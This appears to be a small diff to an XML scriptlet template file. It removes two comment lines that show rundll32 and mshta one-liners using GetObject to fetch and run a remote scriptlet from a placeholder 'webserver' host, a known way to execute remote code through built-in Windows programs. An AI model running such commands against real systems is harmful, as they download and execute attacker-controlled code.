@@ -1,6 +1,4 @@
 <?XML version="1.0"?>
-<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
-<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
 <scriptlet>
 <public>
 </public>
